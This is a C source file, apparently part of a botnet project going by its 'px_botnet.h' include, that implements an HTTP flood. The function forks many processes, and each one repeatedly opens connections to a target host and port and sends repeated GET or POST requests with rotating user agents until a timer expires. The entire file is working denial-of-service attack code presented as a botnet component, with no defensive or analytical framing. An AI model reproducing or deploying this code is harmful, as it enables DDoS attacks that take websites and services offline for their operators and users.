#include "../../includes/px_botnet.h"

extern const char *useragents[];

void HTTP(char *method, char *host, in_port_t port, char *path, int timeEnd, int power)
{
    int error = 0, sock, i, end = time(NULL) + timeEnd, sendIP = 0;
    char request[512 + strlen(path)], buffer[1];

    for (i = 0; i < power; i++)
    {
        if (fork())
        {
            sprintf(request, "%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: Keep-Alive\r\n\r\n", method, path, host, useragents[(rand() % 36)]);
            while (end > time(NULL))
            {
                sock = socket_connect(host, port);
                if (sock < 0) {
                    perror("socket_connect");
                    return;
                }

                i = 0;
                while (i++ < power * 2 && error != -1) {
                    error = write(sock, request, strlen(request));
                    if (error < 0) {
                        perror("write");
                        close(sock);
                        return;
                    }
                }

                error = read(sock, buffer, 1);
                if (error < 0) {
                    perror("read");
                    close(sock);
                    return;
                }

                close(sock);
            }
            exit(0);
        }
    }
}